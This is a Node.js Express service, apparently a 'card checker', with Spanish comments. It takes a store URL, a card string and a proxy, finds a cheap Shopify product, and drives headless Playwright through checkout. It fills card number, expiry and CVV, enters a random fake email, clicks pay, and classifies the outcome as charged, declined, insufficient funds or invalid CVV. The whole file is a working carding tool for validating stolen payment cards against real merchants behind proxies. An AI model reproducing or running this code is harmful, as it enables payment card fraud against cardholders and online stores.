const express = require('express');
const axios = require('axios');
const { chromium } = require('playwright'); // <-- AÑADIDO

const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

// ==========================================
// UTILIDADES
// ==========================================
function parseProxy(proxyStr) {
  if (!proxyStr) return null;
  const parts = proxyStr.split(':');
  if (parts.length === 4) {
    return { server: `http://${parts[0]}:${parts[1]}`, username: parts[2], password: parts[3] };
  } else if (parts.length === 2) {
    return { server: `http://${parts[0]}:${parts[1]}` };
  }
  return null;
}

// ==========================================
// PASO 1: OBTENER VARIANT_ID (Con Axios, es rápido)
// ==========================================
async function getVariantIdByPrice(site, targetPrice) {
  try {
    const response = await axios.get(`${site}/products.json?limit=250`, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' },
      timeout: 15000
    });

    const products = response.data.products || [];
    if (products.length === 0) return null;

    if (!targetPrice || targetPrice <= 0) {
      return { variantId: products[0].variants[0].id, price: parseFloat(products[0].variants[0].price) };
    }

    let bestVariant = null;
    let bestDiff = Infinity;

    for (const product of products) {
      for (const variant of product.variants) {
        if (!variant.available) continue;
        const price = parseFloat(variant.price);
        const diff = Math.abs(price - targetPrice);
        if (diff < bestDiff) {
          bestDiff = diff;
          bestVariant = variant;
        }
      }
    }

    if (!bestVariant) return null;
    return { variantId: bestVariant.id, price: parseFloat(bestVariant.price) };
  } catch (e) {
    return null;
  }
}

// ==========================================
// PASO 2 y 3: PLAYWRIGHT (Añadir al carrito y Checkout)
// ==========================================
async function addToCartAndCheckout(site, variantId, cc, proxyConfig) {
  let browser;
  try {
    browser = await chromium.launch({
      headless: true,
      proxy: proxyConfig || undefined,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });

    const context = await browser.newContext({
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    });
    const page = await context.newPage();

    // 1. Ir directo al endpoint de añadir al carrito
    await page.goto(`${site}/cart/add?id=${variantId}&quantity=1`, { waitUntil: 'domcontentloaded', timeout: 30000 });

    // 2. Ir al Checkout
    await page.goto(`${site}/checkout`, { waitUntil: 'domcontentloaded', timeout: 30000 });

    // Verificar si estamos en el carrito vacío
    const bodyText = await page.innerText('body').catch(() => '');
    if (bodyText.toLowerCase().includes('cart is empty')) {
      return { Response: "Site Error: Cart is empty", Price: 0, Gateway: "Shopify", Status: false };
    }

    // 3. Parsear tarjeta y rellenar iframes
    const [cardNumber, month, year, cvv] = cc.split('|');
    const fullYear = year.length === 2 ? `20${year}` : year;

    // Rellenar Número de tarjeta
    const cardFrame = page.frameLocator('iframe[name="card-fields-iframe"], iframe[title="Card number"]').first();
    await cardFrame.locator('input[name="number"], input[autocomplete="cc-number"]').fill(cardNumber, { timeout: 20000 });

    // Rellenar Expiración
    const expiryFrame = page.frameLocator('iframe[name="card-fields-iframe"], iframe[title="Expiration date"]').nth(1);
    await expiryFrame.locator('input[name="expiry"], input[autocomplete="cc-exp"]').fill(`${month}/${fullYear.slice(-2)}`, { timeout: 20000 });

    // Rellenar CVV
    const cvvFrame = page.frameLocator('iframe[name="card-fields-iframe"], iframe[title="Security code"]').nth(2);
    await cvvFrame.locator('input[name="verification_value"], input[autocomplete="cc-csc"]').fill(cvv, { timeout: 20000 });

    // Rellenar email si lo pide
    const emailInput = await page.$('input[type="email"], input[name="email"]');
    if (emailInput) {
      await emailInput.fill(`test${Math.floor(Math.random() * 999999)}@gmail.com`);
    }

    // 4. Hacer clic en Pagar
    const payButton = await page.$('button[type="submit"][name="button"], button:has-text("Pay now"), button:has-text("Complete order")');
    if (!payButton) {
      return { Response: "Site Error: Pay button not found", Price: 0, Gateway: "Shopify", Status: false };
    }
    await payButton.click();

    // 5. Esperar respuesta
    await page.waitForTimeout(10000);
    const finalText = await page.innerText('body').catch(() => '');
    const finalUrl = page.url();

    if (/order_paid|order_placed/i.test(finalText) || finalUrl.includes('/thank_you') || finalUrl.includes('/orders/')) {
      return { Response: "Charged (Order Paid)", Price: 0, Gateway: "Shopify", Status: true };
    } else if (/thank you|payment successful|order confirmed/i.test(finalText)) {
      return { Response: "Charged", Price: 0, Gateway: "Shopify", Status: true };
    } else if (/insufficient funds/i.test(finalText)) {
      return { Response: "Insufficient Funds", Price: 0, Gateway: "Shopify", Status: false };
    } else if (/invalid cvv|incorrect cvv/i.test(finalText)) {
      return { Response: "Invalid CVV", Price: 0, Gateway: "Shopify", Status: false };
    } else if (/declined|generic_error/i.test(finalText)) {
      return { Response: "Declined", Price: 0, Gateway: "Shopify", Status: false };
    } else {
      return { Response: "Declined (Unknown)", Price: 0, Gateway: "Shopify", Status: false };
    }

  } catch (err) {
    return { Response: `Site Error: ${err.message}`, Price: 0, Gateway: "Shopify", Status: false };
  } finally {
    if (browser) await browser.close();
  }
}

// ==========================================
// FUNCIÓN PRINCIPAL
// ==========================================
async function checkCard(site, cc, targetPrice, proxyConfig) {
  try {
    let normalizedSite = site.startsWith('http') ? site : `https://${site}`;
    normalizedSite = normalizedSite.replace(/\/$/, '');

    const productData = await getVariantIdByPrice(normalizedSite, targetPrice);
    if (!productData) {
      return { Response: "Site Error: No product found", Price: 0, Gateway: "Shopify", Status: false };
    }

    const result = await addToCartAndCheckout(normalizedSite, productData.variantId, cc, proxyConfig);
    result.Price = productData.price;
    return result;

  } catch (err) {
    return { Response: `Site Error: ${err.message}`, Price: 0, Gateway: "Shopify", Status: false };
  }
}

// ==========================================
// ENDPOINT
// ==========================================
app.all('/shopify', async (req, res) => {
  const { site, cc, proxy, price } = req.query;
  if (!site || !cc) return res.status(400).json({ Response: "Missing parameters", Price: 0, Gateway: "Unknown", Status: false });

  const result = await checkCard(site, cc, price ? parseFloat(price) : 0, parseProxy(proxy));
  res.json(result);
});

app.get('/health', (req, res) => res.json({ status: 'ok' }));
app.listen(PORT, () => console.log(`✅ Checker running with Playwright`));
